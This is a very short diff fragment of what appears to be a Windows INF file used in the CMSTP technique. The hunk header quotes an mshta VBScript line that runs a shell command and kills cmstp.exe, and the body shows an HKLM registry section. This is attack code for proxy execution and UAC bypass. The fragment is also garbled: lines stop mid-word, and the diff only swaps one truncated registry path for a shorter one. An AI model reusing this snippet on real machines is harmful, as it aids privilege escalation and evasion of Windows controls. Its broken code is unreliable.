@@ -100,4 +100,4 @@ mshta vbscript:Execute(""CreateObject('WScript.Shell').Run 'taskkill /IM cmstp.e
 49000,49001=AllUSer_LDIDSection, 7
 
 [AllUSer_LDIDSection]
-HKLM, SOFTWARE\Microsoft\Windows\CurrentVersion\A
+HKLM, SOFTWARE\Microsoft\Windows\CurrentVersi
